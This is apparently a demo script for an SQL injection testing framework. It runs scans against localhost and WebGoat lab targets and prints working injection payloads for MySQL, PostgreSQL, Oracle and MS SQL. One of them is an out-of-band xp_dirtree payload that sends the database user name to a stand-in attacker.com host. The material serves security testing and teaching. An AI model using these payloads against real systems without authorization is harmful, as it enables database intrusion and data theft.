#!/usr/bin/env python3
"""
Advanced SQL Injection Testing - Demo Script

This script demonstrates how to use the advanced_sql_injection_test.py framework
with different configurations and targets.
"""

import subprocess
import time
import os
from pathlib import Path

def run_command(command, description):
    """Execute a command and display results"""
    print(f"\n[*] {description}")
    print(f"Command: {command}")
    print("-" * 60)
    
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=60
        )
        
        if result.returncode == 0:
            print("[+] Success!")
            if result.stdout:
                print("Output:")
                print(result.stdout)
        else:
            print("[-] Error!")
            if result.stderr:
                print("Error output:")
                print(result.stderr)
        
    except subprocess.TimeoutExpired:
        print("[!] Timeout - Command took too long")
    except Exception as e:
        print(f"[!] Exception: {e}")

def demo_verification():
    """Demo setup verification"""
    print("="*80)
    print("STEP 1: SETUP VERIFICATION")
    print("="*80)   
    
    run_command(
        "python verify_setup.py",
        "Verifying configuration and dependencies"
    )

def demo_basic_tests():
    """Démonstration des tests de base"""
    print("\n" + "="*80)
    print("🧪 ÉTAPE 2: TESTS DE BASE")
    print("="*80)
    
    # Test Union-based uniquement (rapide)
    run_command(
        "python advanced_sql_injection_test.py --union_only --headless --target_url http://localhost:5000",
        "Tests Union-based en mode headless"
    )

def demo_specific_tests():
    """Démonstration de tests spécifiques"""
    print("\n" + "="*80)
    print("🔍 ÉTAPE 3: TESTS SPÉCIFIQUES")
    print("="*80)
    
    test_scenarios = [
        {
            "command": "python advanced_sql_injection_test.py --blind_only --target_url http://localhost:5000",
            "description": "Tests Boolean Blind uniquement"
        },
        {
            "command": "python advanced_sql_injection_test.py --time_only --headless --target_url http://localhost:5000", 
            "description": "Tests Time-based en mode headless"
        },
        {
            "command": "python advanced_sql_injection_test.py --oob_only --target_url http://localhost:5000",
            "description": "Tests Out-of-band (simulation)"
        }
    ]
    
    for scenario in test_scenarios:
        run_command(scenario["command"], scenario["description"])
        time.sleep(2)  # Délai entre les tests

def demo_complete_scan():
    """Démonstration d'un scan complet"""
    print("\n" + "="*80)
    print("🎯 ÉTAPE 4: SCAN COMPLET")
    print("="*80)
    
    run_command(
        "python advanced_sql_injection_test.py --target_url http://localhost:5000",
        "Scan complet avec tous les types d'injection SQL"
    )

def demo_webgoat_tests():
    """Démonstration avec WebGoat"""
    print("\n" + "="*80)
    print("🕷️ ÉTAPE 5: TESTS WEBGOAT")
    print("="*80)
    
    print("⚠️ PRÉREQUIS: WebGoat doit être démarré sur localhost:8080")
    print("   Docker: docker run -p 8080:8080 webgoat/webgoat")
    print("   Ou JAR: java -jar webgoat-2024.x.jar")
    
    # Tests WebGoat (si disponible)
    run_command(
        "python advanced_sql_injection_test.py --union_only --headless --target_url http://localhost:8080/WebGoat/login",
        "Tests Union-based sur WebGoat"
    )

def show_results_analysis():
    """Montrer comment analyser les résultats"""
    print("\n" + "="*80)
    print("📊 ÉTAPE 6: ANALYSE DES RÉSULTATS")
    print("="*80)
    
    # Chercher les fichiers de résultats
    results_files = list(Path(".").glob("advanced_sql_injection_results_*.json"))
    
    if results_files:
        latest_result = max(results_files, key=lambda f: f.stat().st_mtime)
        print(f"📄 Dernier fichier de résultats: {latest_result}")
        
        # Afficher un aperçu du contenu
        try:
            import json
            with open(latest_result, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            print(f"🎯 Cible testée: {data.get('target_url', 'N/A')}")
            print(f"📅 Date: {data.get('timestamp', 'N/A')}")
            
            summary = data.get('summary', {})
            print(f"🧪 Total tests: {summary.get('total_tests', 0)}")
            print(f"🔓 Vulnérabilités: {summary.get('vulnerabilities_found', 0)}")
            print(f"📈 Taux de succès: {summary.get('success_rate', 0):.1f}%")
            
            # Détail par type
            tests = data.get('tests_performed', {})
            for test_type, results in tests.items():
                if results:
                    vulnerabilities = sum(1 for r in results if r.get('vulnerable') or 'SUCCÈS' in r.get('status', ''))
                    print(f"  • {test_type}: {len(results)} tests, {vulnerabilities} vulnérabilités")
            
        except Exception as e:
            print(f"❌ Erreur lors de l'analyse: {e}")
    else:
        print("📭 Aucun fichier de résultats trouvé")
        print("   Exécutez d'abord des tests pour générer des résultats")

def show_payload_examples():
    """Montrer des exemples de payloads"""
    print("\n" + "="*80)
    print("🧬 ÉTAPE 7: EXEMPLES DE PAYLOADS")
    print("="*80)
    
    payload_examples = {
        "Union-based (MySQL)": [
            "' UNION SELECT 1,user(),database(),version()-- ",
            "' UNION SELECT null,null,table_name,null FROM information_schema.tables-- "
        ],
        "Boolean Blind (PostgreSQL)": [
            "admin' AND (SELECT SUBSTRING(current_user,1,1))='p'-- ",
            "admin' AND (SELECT COUNT(*) FROM pg_tables)>20-- "
        ],
        "Time-based (Oracle)": [
            "admin' AND (SELECT COUNT(*) FROM all_objects,all_objects,all_objects)>1000000-- "
        ],
        "Out-of-band (MS SQL)": [
            "admin' EXEC master..xp_dirtree '\\\\\\\\'+user_name()+'.attacker.com\\\\share'-- "
        ]
    }
    
    for category, payloads in payload_examples.items():
        print(f"\n🔸 {category}:")
        for i, payload in enumerate(payloads, 1):
            print(f"  {i}. {payload}")

def main():
    """Main demonstration function"""
    print("Advanced SQL Injection Testing Framework")
    print("Version 2.0 with multi-database and multi-technique support")
    print("="*80)
    
    print("""
This demonstration will guide you through:
- Setup verification
- Basic tests (Union-based)  
- Specific tests (Blind, Time-based, Out-of-band)
- Complete scan
- WebGoat testing
- Results analysis
- Payload examples
    """)
    
    # Ask for confirmation
    try:
        choice = input("\nStart demonstration? (y/n): ").lower().strip()
        if choice not in ['y', 'yes']:
            print("Demonstration cancelled")
            return 0
    except KeyboardInterrupt:
        print("\nDemonstration cancelled")
        return 0
    
    # Étapes de la démonstration
    try:
        demo_verification()
        
        # Continuer seulement si le setup est OK
        choice = input("\n▶️ Continuer avec les tests ? (o/n): ").lower().strip()
        if choice in ['o', 'oui', 'y', 'yes']:
            demo_basic_tests()
            demo_specific_tests() 
            demo_complete_scan()
            demo_webgoat_tests()
        
        show_results_analysis()
        show_payload_examples()
        
        print("\n" + "="*80)
        print("✅ DÉMONSTRATION TERMINÉE")
        print("="*80)
        print("""
🎓 Prochaines étapes recommandées:
  1. Analyser les fichiers de résultats JSON générés
  2. Tester sur vos propres applications (avec autorisation)
  3. Personnaliser les payloads selon vos besoins
  4. Intégrer dans vos pipelines de sécurité
  
📚 Documentation complète: ADVANCED_SQL_INJECTION_GUIDE.md
        """)
        
    except KeyboardInterrupt:
        print("\n\n🚪 Démonstration interrompue par l'utilisateur")
        return 0
    except Exception as e:
        print(f"\n💥 Erreur inattendue: {e}")
        return 1
    
    return 0

if __name__ == "__main__":
    exit(main())